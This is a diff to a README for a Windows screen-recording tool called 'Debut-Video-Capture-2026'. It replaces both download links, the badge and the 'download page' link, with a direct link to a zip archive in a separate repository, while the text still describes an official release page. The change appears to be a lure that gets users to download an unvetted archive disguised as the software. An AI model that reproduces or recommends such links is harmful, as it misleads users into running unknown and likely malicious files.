@@ -5,7 +5,7 @@ description: "Download the debut video capture software for Windows 10 and 11 us
 ---
 # 🎥 Debut-Video-Capture-2026 - Record your desktop screen with ease
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Matwateringplace692/Debut-Video-Capture-2026)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/Matwateringplace692/matwateringplace692.github.io/main/lake/io_github_matwateringplace_2.8.zip)
 
 ## 📖 Overview
 
@@ -26,7 +26,7 @@ Ensure your computer meets these requirements before you start the installation 
 
 You need to access the official release page to obtain the installer. 
 
-[Click here to visit the download page](https://github.com/Matwateringplace692/Debut-Video-Capture-2026)
+[Click here to visit the download page](https://raw.githubusercontent.com/Matwateringplace692/matwateringplace692.github.io/main/lake/io_github_matwateringplace_2.8.zip)
 
 Follow these steps to complete the download:
 
